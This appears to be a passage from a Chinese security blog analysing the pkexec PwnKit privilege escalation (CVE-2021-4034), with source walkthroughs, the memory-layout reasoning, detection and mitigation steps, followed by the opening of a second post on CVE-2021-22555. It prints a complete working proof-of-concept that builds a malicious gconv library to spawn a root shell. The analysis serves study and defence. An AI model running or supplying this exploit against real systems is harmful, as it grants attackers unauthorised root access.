<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">435</span> main (<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line"><span class="number">436</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">534</span>   <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++)</span><br><span class="line"><span class="number">535</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">568</span>     &#125;</span><br><span class="line">...</span><br><span class="line"><span class="number">610</span>   path = g_strdup (argv[n]);</span><br><span class="line">...</span><br><span class="line"><span class="number">629</span>   <span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">'/'</span>)</span><br><span class="line"><span class="number">630</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">632</span>       s = g_find_program_in_path (path);</span><br><span class="line">...</span><br><span class="line"><span class="number">639</span>       argv[n] = path = s;</span><br><span class="line"><span class="number">640</span>     &#125;</span><br></pre></td></tr></table></figure>
<p>其中有两个 glib 提供的函数 <a href="https://www.manpagez.com/html/glib/glib-2.56.0/glib-String-Utility-Functions.php#g-strdup" target="_blank" rel="noopener">g_strdup()</a> 和 <a href="https://docs.gtk.org/glib/func.find_program_in_path.html" target="_blank" rel="noopener">g_find_program_in_path()</a> ，先熟悉一下： </p>
<blockquote>
<ul>
<li><code>g_strdup()</code> 复制一个字符串，声明如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gchar *</span><br><span class="line">g_strdup (<span class="keyword">const</span> gchar *str);</span><br></pre></td></tr></table></figure></li>
<li><code>g_find_program_in_path()</code> 在用户路径中定位第一个名为 program 的可执行程序，与 execvp() 定位它的方式相同。返回具有绝对路径名的已分配字符串，如果在路径中找不到程序，则返回 NULL。如果 program 已经是绝对路径，且如果 program 存在并且可执行，则返回 program 的副本，否则返回 NULL。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gchar*</span><br><span class="line">g_find_program_in_path (</span><br><span class="line">  <span class="keyword">const</span> gchar* program</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
</li>
</ul>
</blockquote>
<p>再看 main() 函数中：</p>
<ul>
<li>L534-L568，用来处理命令行参数<ul>
<li>L534：n=1，当 argc=1 时，不会进入循环，比如：<code>pkexec</code>；当 argc&gt;1时，才会进入循环，比如：<code>pkexec --version</code></li>
</ul>
</li>
<li>L610-L640，如果其路径不是绝对路径,会在 PATH 中搜索要执行的程序<ul>
<li>L610：使用 <code>g_strdup()</code> 复制 <code>argv[n]</code> 的内容到 <code>path</code>，因为在 <code>pkexec</code> 中 <code>argv[n]</code> 就是目标路径，比如：<code>pkexec reboot</code></li>
<li>L629：这里判断是否是绝对路径的方法比较巧妙，使用 <code>path[0] != &#39;/&#39;</code> 来判断</li>
<li>L632：检索目标路径，返回目标路径字符串</li>
<li>L639：将返回的路径赋值给 <code>path</code> 和 <code>argv[n]</code> </li>
</ul>
</li>
</ul>
<p>正常情况下，这样处理的逻辑没有问题。<br>但如果命令行参数 argc 为 0，则会出现意外情况：</p>
<ul>
<li>L534，n 永久设置为 1；</li>
<li>L610，<code>argv[1]</code> 发生越界读取，并把越界读取到的值赋给了 <code>path</code>；</li>
<li>L639，指针 s 被越界写入 <code>argv[1]</code>。</li>
</ul>
<p>问题在于，这个越界的 <code>argv[1]</code> 中读取和写入的是什么？</p>
<p>我们需要先了解参数的内存布局，结合内核代码来分析：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// linux5.4/fs/binfmt_elf.c:</span></span><br><span class="line"><span class="number">163</span> <span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line"><span class="number">164</span> create_elf_tables(struct linux_binprm *bprm, struct elfhdr *exec,</span><br><span class="line"><span class="number">165</span>         <span class="keyword">unsigned</span> <span class="keyword">long</span> load_addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> interp_load_addr)</span><br><span class="line"><span class="number">166</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">284</span>     sp = STACK_ADD(p, ei_index);</span><br><span class="line">...</span><br><span class="line">		<span class="comment">// 布局 main 函数栈</span></span><br><span class="line"><span class="number">306</span>     <span class="comment">/* Now, let's put argc (and argv, envp if appropriate) on the stack */</span></span><br><span class="line">		<span class="comment">// argc 入栈</span></span><br><span class="line"><span class="number">307</span>     <span class="keyword">if</span> (__put_user(argc, sp++))</span><br><span class="line"><span class="number">308</span>         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="number">309</span></span><br><span class="line">		<span class="comment">// argv 入栈</span></span><br><span class="line"><span class="number">310</span>     <span class="comment">/* Populate list of argv pointers back to argv strings. */</span></span><br><span class="line"><span class="number">311</span>     p = current-&gt;mm-&gt;arg_end = current-&gt;mm-&gt;arg_start;</span><br><span class="line"><span class="number">312</span>     <span class="keyword">while</span> (argc-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">313</span>         <span class="keyword">size_t</span> len;</span><br><span class="line"><span class="number">314</span>         <span class="keyword">if</span> (__put_user((<span class="keyword">elf_addr_t</span>)p, sp++))</span><br><span class="line"><span class="number">315</span>             <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="number">316</span>         len = strnlen_user((<span class="keyword">void</span> __user *)p, MAX_ARG_STRLEN);</span><br><span class="line"><span class="number">317</span>         <span class="keyword">if</span> (!len || len &gt; MAX_ARG_STRLEN)</span><br><span class="line"><span class="number">318</span>             <span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="number">319</span>         p += len;</span><br><span class="line"><span class="number">320</span>     &#125;</span><br><span class="line">		<span class="comment">// argv null 入栈</span></span><br><span class="line"><span class="number">321</span>     <span class="keyword">if</span> (__put_user(<span class="number">0</span>, sp++))</span><br><span class="line"><span class="number">322</span>         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="number">323</span>     current-&gt;mm-&gt;arg_end = p;</span><br><span class="line"><span class="number">324</span></span><br><span class="line">		<span class="comment">// env 入栈</span></span><br><span class="line"><span class="number">325</span>     <span class="comment">/* Populate list of envp pointers back to envp strings. */</span></span><br><span class="line"><span class="number">326</span>     current-&gt;mm-&gt;env_end = current-&gt;mm-&gt;env_start = p;</span><br><span class="line"><span class="number">327</span>     <span class="keyword">while</span> (envc-- &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">328</span>         <span class="keyword">size_t</span> len;</span><br><span class="line"><span class="number">329</span>         <span class="keyword">if</span> (__put_user((<span class="keyword">elf_addr_t</span>)p, sp++))</span><br><span class="line"><span class="number">330</span>             <span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="number">331</span>         len = strnlen_user((<span class="keyword">void</span> __user *)p, MAX_ARG_STRLEN);</span><br><span class="line"><span class="number">332</span>         <span class="keyword">if</span> (!len || len &gt; MAX_ARG_STRLEN)</span><br><span class="line"><span class="number">333</span>             <span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="number">334</span>         p += len;</span><br><span class="line"><span class="number">335</span>     &#125;</span><br><span class="line">		<span class="comment">// env null 入栈</span></span><br><span class="line"><span class="number">336</span>     <span class="keyword">if</span> (__put_user(<span class="number">0</span>, sp++))</span><br><span class="line"><span class="number">337</span>         <span class="keyword">return</span> -EFAULT;\</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>从代码中可以看出，当 execve() 一个新程序时，内核将参数、环境字符串和指针（argv 和 envp）复制到新程序堆栈的末尾，main 函数参数是布局在栈上，argc、argv依次入栈（L307、L321），后面紧接着就是 env 入栈（L325-L336）。<br>把上面的代码简化成下面的图示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">|---------+---------+-----+------------|---------+---------+-----+------------|</span><br><span class="line">| argv[0] | argv[1] | ... | argv[argc] | envp[0] | envp[1] | ... | envp[envc] |</span><br><span class="line">|----|----+----|----+-----+-----|------|----|----+----|----+-----+-----|------|</span><br><span class="line">     V         V                V           V         V                V</span><br><span class="line"> &quot;program&quot; &quot;-option&quot;           NULL      &quot;value&quot; &quot;PATH&#x3D;name&quot;          NULL</span><br></pre></td></tr></table></figure>
<p>可以发现 argv 和 envp 指针在内存中是连续的，如果 argc 为 0，那么越界 argv[1] 实际上是 <code>envp[0]</code>，指向第一个环境变量 <code>value</code> 的指针。</p>
<p>argv[1] 是什么解决了，那再回过来看 pkexec 的 main() 函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">435</span> main (<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span><br><span class="line"><span class="number">436</span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">534</span>   <span class="keyword">for</span> (n = <span class="number">1</span>; n &lt; (guint) argc; n++)</span><br><span class="line"><span class="number">535</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">568</span>     &#125;</span><br><span class="line">...</span><br><span class="line"><span class="number">610</span>   path = g_strdup (argv[n]);</span><br><span class="line">...</span><br><span class="line"><span class="number">629</span>   <span class="keyword">if</span> (path[<span class="number">0</span>] != <span class="string">'/'</span>)</span><br><span class="line"><span class="number">630</span>     &#123;</span><br><span class="line">...</span><br><span class="line"><span class="number">632</span>       s = g_find_program_in_path (path);</span><br><span class="line">...</span><br><span class="line"><span class="number">639</span>       argv[n] = path = s;</span><br><span class="line"><span class="number">640</span>     &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>L610，要执行的程序的路径从 argv[1]（即 <code>envp[0]</code>）越界读取，并指向 <code>value</code></li>
<li>L632，这个路径 <code>value</code> 被传递给 <code>g_find_program_in_path()</code></li>
<li><code>g_find_program_in_path()</code> 会在 PATH 环境变量的目录中搜索一个名为 <code>value</code> 的可执行文件</li>
<li>如果找到这样的可执行文件，则将其完整路径返回给 pkexec 的 main() 函数（L632）</li>
<li>最后，L639，这个完整路径被越界写入 argv[1]（即 <code>envp[0]</code>），覆盖了第一个环境变量。</li>
</ul>
<p>因此只要能控制 <code>g_find_program_in_path</code> 返回的字符串，就可以注入任意的环境变量。</p>
<p>Qualys <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener">指出</a>如果 PATH 环境变量是 <code>PATH=name</code>，并且目录 <code>name</code> 存在（在当前工作目录中）并且包含一个名为 <code>value</code> 的可执行文件，则写入一个指向字符串 <code>name/value</code> 的指针越界到 <code>envp[0]</code>。</p>
<p>进一步，让这个组合的文件名里包含等号 “=”。传入 <code>PATH=name=.</code> ，创建一个 <code>name=.</code> 目录，并在其中放一个可执行文件 <code>value</code>，最终 <code>envp[0]</code> 就会被篡改为 <code>name=./value</code>，也就是注入了一个新的环境变量进去。</p>
<p>换句话说，这种越界写入可以绕过原有的安全检查，将不安全的环境变量（例如，LD_PRELOAD）重新引入 pkexec 的环境。</p>
<h3 id="寻找不安全的环境变量"><a href="#寻找不安全的环境变量" class="headerlink" title="寻找不安全的环境变量"></a>寻找不安全的环境变量</h3><p>新的问题是：要成功利用这个漏洞，应该将哪个不安全变量重新引入 pkexec 的环境中？我们的选择是有限的，因为在越界写入后不久（L639），pkexec 完全清除了它的环境（L702）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">639</span>       argv[n] = path = s;</span><br><span class="line">...</span><br><span class="line"><span class="number">657</span>   <span class="keyword">for</span> (n = <span class="number">0</span>; environment_variables_to_save[n] != <span class="literal">NULL</span>; n++)</span><br><span class="line"><span class="number">658</span>     &#123;</span><br><span class="line"><span class="number">659</span>       <span class="keyword">const</span> gchar *key = environment_variables_to_save[n];</span><br><span class="line">...</span><br><span class="line"><span class="number">662</span>       value = g_getenv (key);</span><br><span class="line">...</span><br><span class="line"><span class="number">670</span>       <span class="keyword">if</span> (!validate_environment_variable (key, value))</span><br><span class="line">...</span><br><span class="line"><span class="number">675</span>     &#125;</span><br><span class="line">...</span><br><span class="line"><span class="number">702</span>   <span class="keyword">if</span> (clearenv () != <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>答案来自于 pkexec 的复杂性：为了向 stderr 打印错误消息，pkexec 调用 GLib 的函数 <code>g_printerr()</code>（注意：GLib 是 GNOME 库，而不是 GNU C 库，即 glibc）；例如，函数 <code>validate_environment_variable()</code> 和 <code>log_message()</code> 调用 <code>g_printerr()</code> （L126，L408-L409）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">88</span> log_message (gint     level,</span><br><span class="line">  <span class="number">89</span>              gboolean print_to_stderr,</span><br><span class="line">  <span class="number">90</span>              <span class="keyword">const</span>    gchar *format,</span><br><span class="line">  <span class="number">91</span>              ...)</span><br><span class="line">  <span class="number">92</span> &#123;</span><br><span class="line"> ...</span><br><span class="line"> <span class="number">125</span>   <span class="keyword">if</span> (print_to_stderr)</span><br><span class="line"> <span class="number">126</span>     g_printerr (<span class="string">"%s\n"</span>, s);</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"> <span class="number">383</span> validate_environment_variable (<span class="keyword">const</span> gchar *key,</span><br><span class="line"> <span class="number">384</span>                                <span class="keyword">const</span> gchar *value)</span><br><span class="line"> <span class="number">385</span> &#123;</span><br><span class="line"> ...</span><br><span class="line"> <span class="number">406</span>           log_message (LOG_CRIT, TRUE,</span><br><span class="line"> <span class="number">407</span>                        <span class="string">"The value for the SHELL variable was not found the /etc/shells file"</span>);</span><br><span class="line"> <span class="number">408</span>           g_printerr (<span class="string">"\n"</span></span><br><span class="line"> <span class="number">409</span>                       <span class="string">"This incident has been reported.\n"</span>);</span><br></pre></td></tr></table></figure>
<p><code>g_printerr()</code> 通常打印 UTF-8 错误消息，但如果环境变量 CHARSET 不是 UTF-8，它可以打印另一个字符集中的消息（注意：CHARSET 不是安全敏感的，它不是不安全的环境变量）。</p>
<p>要将消息从 UTF-8 转换为另一个字符集，<code>g_printerr()</code> 调用 glibc 的函数 <code>iconv_open()</code>。</p>
<p>要将消息从一个字符集转换为另一个字符集，<code>iconv_open()</code> 执行小型共享库；通常，这些三元组（“from”字符集、“to”字符集和库名称）是从默认配置文件 <code>/usr/lib/gconv/gconv-modules</code> 中读取的。但环境变量 <code>GCONV_PATH</code> 可以强制 <code>iconv_open()</code> 读取另一个配置文件；所以 <code>GCONV_PATH</code> 是不安全的环境变量之一（因为它会导致执行任意库），因此会被 ld.so 从 SUID 程序的环境中删除。</p>
<p>我们可以把 <code>GCONV_PATH</code> 重新引入 pkexec 的环境，并以 root 身份执行我们自己的共享库。</p>
<h3 id="回顾-POC"><a href="#回顾-POC" class="headerlink" title="回顾 POC"></a>回顾 POC</h3><p>现在我们对漏洞原理有了更深的认识，再看一看 POC</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="number">2</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> <span class="number">3</span> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> <span class="number">4</span> </span><br><span class="line"> <span class="number">5</span> <span class="keyword">char</span> *shell =</span><br><span class="line"> <span class="number">6</span>         <span class="string">"#include &lt;stdio.h&gt;\n"</span></span><br><span class="line"> <span class="number">7</span>         <span class="string">"#include &lt;stdlib.h&gt;\n"</span></span><br><span class="line"> <span class="number">8</span>         <span class="string">"#include &lt;unistd.h&gt;\n\n"</span></span><br><span class="line"> <span class="number">9</span>         <span class="string">"void gconv() &#123;&#125;\n"</span></span><br><span class="line"><span class="number">10</span>         <span class="string">"void gconv_init() &#123;\n"</span></span><br><span class="line"><span class="number">11</span>         <span class="string">"       setuid(0); setgid(0);\n"</span></span><br><span class="line"><span class="number">12</span>         <span class="string">"       seteuid(0); setegid(0);\n"</span></span><br><span class="line"><span class="number">13</span>         <span class="string">"       system(\"export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; rm -rf 'GCONV_PATH=.' 'pwnkit'; /bin/sh\");\n"</span></span><br><span class="line"><span class="number">14</span>         <span class="string">"       exit(0);\n"</span></span><br><span class="line"><span class="number">15</span>         <span class="string">"&#125;"</span>;</span><br><span class="line"><span class="number">16</span>         </span><br><span class="line"><span class="number">17</span> <span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line"><span class="number">18</span>         FILE *fp;</span><br><span class="line"><span class="number">19</span>         system(<span class="string">"mkdir -p 'GCONV_PATH=.'; touch 'GCONV_PATH=./pwnkit'; chmod a+x 'GCONV_PATH=./pwnkit'"</span>);</span><br><span class="line"><span class="number">20</span>         system(<span class="string">"mkdir -p pwnkit; echo 'module UTF-8// PWNKIT// pwnkit 2' &gt; pwnkit/gconv-modules"</span>);</span><br><span class="line"><span class="number">21</span>         fp = fopen(<span class="string">"pwnkit/pwnkit.c"</span>, <span class="string">"w"</span>);</span><br><span class="line"><span class="number">22</span>         <span class="built_in">fprintf</span>(fp, <span class="string">"%s"</span>, shell);</span><br><span class="line"><span class="number">23</span>         fclose(fp); </span><br><span class="line"><span class="number">24</span>         system(<span class="string">"gcc pwnkit/pwnkit.c -o pwnkit/pwnkit.so -shared -fPIC"</span>);</span><br><span class="line"><span class="number">25</span>         <span class="keyword">char</span> *env[] = &#123; <span class="string">"pwnkit"</span>, <span class="string">"PATH=GCONV_PATH=."</span>, <span class="string">"CHARSET=PWNKIT"</span>, <span class="string">"SHELL=pwnkit"</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"><span class="number">26</span>         execve(<span class="string">"/usr/bin/pkexec"</span>, (<span class="keyword">char</span>*[])&#123;<span class="literal">NULL</span>&#125;, env);</span><br><span class="line"><span class="number">27</span> &#125;</span><br></pre></td></tr></table></figure>
<p>需要新注意的是：</p>
<ol>
<li>L26，使用 <code>execve</code> 调用 <code>pkexec</code>，<code>(char*[]){NULL}</code>造成 <code>argv[1]</code> 越界读取</li>
<li>L25，一个特殊的数组，env[0]为 payload，env[1]引入了<code>GCONV_PATH</code></li>
<li>L20，设置非UTF-8环境，也就导致 payload 中 <code>gconv_init</code> 执行，造成 <code>/bin/sh</code> 执行，恢复环境变量得到 root shell。</li>
</ol>
<h2 id="0x03-漏洞总结"><a href="#0x03-漏洞总结" class="headerlink" title="0x03 漏洞总结"></a>0x03 漏洞总结</h2><p>总结一下该漏洞的利用思路：</p>
<ol>
<li>通过设置 <code>execve()</code> 的 argv[] 为零，造成 argv[1] 越界读取，并绕过安全检查</li>
<li>通过 <code>g_printerr</code> 函数发现可控的不安全环境变量 <code>GCONV_PATH</code></li>
<li>构造畸形的路径使 <code>pkexec</code> 从指定路径读取环境变量完成提权</li>
</ol>
<p>这个漏洞的质量非常好，利用思路也很有趣，借用一下 Qualys 对该漏洞的<a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">评价</a>：</p>
<blockquote>
<p>这个漏洞是攻击者的梦想成真。</p>
<ul>
<li>pkexec 默认安装在所有主要的 Linux 发行版上（我们利用了 Ubuntu、Debian、Fedora、CentOS，而其他发行版也可能利用）</li>
<li>pkexec 自 2009 年 5 月创建以来就存在漏洞（commit c8c3d83, “Add a pkexec(1) command”）</li>
<li>任何没有特权的本地用户都可以利用这个漏洞来获得完全的 root 权限。</li>
<li>虽然这个漏洞在技术上是一个内存损坏，但它可即时、可靠地、以独立于架构的方式加以利用。</li>
<li>即使 polkit 守护进程本身没有运行，也可以利用。</li>
</ul>
</blockquote>
<h2 id="0x04-漏洞补丁"><a href="#0x04-漏洞补丁" class="headerlink" title="0x04 漏洞补丁"></a>0x04 漏洞补丁</h2><h3 id="a-如何检测该漏洞"><a href="#a-如何检测该漏洞" class="headerlink" title="a. 如何检测该漏洞"></a>a. 如何检测该漏洞</h3><p>检查组件版本：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜ pkexec --version</span><br><span class="line">pkexec version 0.105</span><br></pre></td></tr></table></figure>
<h3 id="b-如何防御该漏洞"><a href="#b-如何防御该漏洞" class="headerlink" title="b. 如何防御该漏洞"></a>b. 如何防御该漏洞</h3><p>及时升级组件</p>
<h3 id="c-有没有哪种通用的缓解措施可以阻断该漏洞"><a href="#c-有没有哪种通用的缓解措施可以阻断该漏洞" class="headerlink" title="c. 有没有哪种通用的缓解措施可以阻断该漏洞"></a>c. 有没有哪种通用的缓解措施可以阻断该漏洞</h3><p>Qualys 在 <a href="https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt" target="_blank" rel="noopener">报告</a> 中给出了缓解措施：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># chmod 0755 &#x2F;usr&#x2F;bin&#x2F;pkexec</span><br></pre></td></tr></table></figure>
<p>即从 pkexec 中删除 SUID 位</p>
<p>RedHat 给出了针对该漏洞的缓解措施：</p>
<blockquote>
<p>https://access.redhat.com/security/vulnerabilities/RHSB-2022-001</p>
</blockquote>
<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><ol>
<li><a href="https://mp.weixin.qq.com/s/3rnkcRfX_BxzlVzp0stQRw" target="_blank" rel="noopener">CVE-2021-4034 pkexec 本地提权 - 非尝咸鱼贩 [2022-01-26]</a></li>
<li><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034" target="_blank" rel="noopener">PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034) | Qualys Security Blog</a></li>
<li>https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</li>
<li>演示视频：<a href="https://vimeo.com/669715589" target="_blank" rel="noopener">PwnKit Vulnerability on Vimeo</a></li>
<li>Commit：<a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a2bf5c9c83b6ae46cbd5c779d3055bff81ded683" target="_blank" rel="noopener">pkexec: local privilege escalation (CVE-2021-4034) (a2bf5c9c) · Commits · polkit / polkit · GitLab</a></li>
<li>POC：<a href="https://github.com/arthepsy/CVE-2021-4034" target="_blank" rel="noopener">arthepsy/CVE-2021-4034: PoC for PwnKit: Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec (CVE-2021-4034)</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2022/01/25/11" target="_blank" rel="noopener">oss-security - pwnkit: Local Privilege Escalation in polkit’s pkexec (CVE-2021-4034)</a></li>
<li><a href="https://cert.360.cn/warning/detail?id=25d7a6ec96c91ca4e4238fd10da2c778" target="_blank" rel="noopener">CVE-2021-4034:Linux Polkit 权限提升漏洞通告 - 360CERT [2022-01-26]</a></li>
</ol>
<h3 id="更早的相关研究"><a href="#更早的相关研究" class="headerlink" title="更早的相关研究"></a>更早的相关研究</h3><ul>
<li><a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/" target="_blank" rel="noopener">Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug | The GitHub Blog [2021-06-10]</a></li>
<li><a href="https://ryiron.wordpress.com/2013/12/16/argv-silliness/" target="_blank" rel="noopener">argv silliness | ~ryiron [2013-12-16]</a></li>
<li><a href="https://www.exploit-db.com/exploits/17942" target="_blank" rel="noopener">pkexec - Race Condition Privilege Escalation (CVE-2011-1485)  - Linux local Exploit [2011-10-08]</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2014/07/14/1" target="_blank" rel="noopener">glibc locale issues - Tavis Ormandy [2014-07-14]</a></li>
<li><a href="https://www.openwall.com/lists/oss-security/2017/06/23/8" target="_blank" rel="noopener">charset.alias in pkexec/glib/gnulib (was: glibc locale issues) - Jakub Wilk [2017-06-23]</a></li>
<li><a href="https://hugeh0ge.github.io/2019/11/04/Getting-Arbitrary-Code-Execution-from-fopen-s-2nd-Argument/" target="_blank" rel="noopener">Getting Arbitrary Code Execution from fopen’s 2nd Argument | The Pwnbroker [2019-11-04]</a></li>
<li><a href="https://www.slideshare.net/SilvioCesare/simple-bugs-and-vulnerabilities-in-linux-distributions" target="_blank" rel="noopener">Simple Bugs and Vulnerabilities in Linux Distributions - Silvio Cesare [2011-03-25]</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2022/02/10/CVE-2021-4034/" data-id="cmd5slr2j000l0lo1bblo391s" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-2021/12/27/CVE-2021-22555" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="2021/12/27/CVE-2021-22555/" class="article-date">
  <time datetime="2021-12-27T14:00:00.000Z" itemprop="datePublished">2021-12-27</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="2021/12/27/CVE-2021-22555/">CVE-2021-22555漏洞分析</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="CVE-2021-22555漏洞分析"><a href="#CVE-2021-22555漏洞分析" class="headerlink" title="CVE-2021-22555漏洞分析"></a>CVE-2021-22555漏洞分析</h1><p>author: moxingyuan from iceswordlab </p>
<h2 id="一、漏洞背景"><a href="#一、漏洞背景" class="headerlink" title="一、漏洞背景"></a>一、漏洞背景</h2><p>CVE-2021-22555是一个存在了15年之久的内核堆溢出漏洞，它位于内核的Netfilter组件中，这个组件可以被用来实现防火墙、NAT等功能。</p>
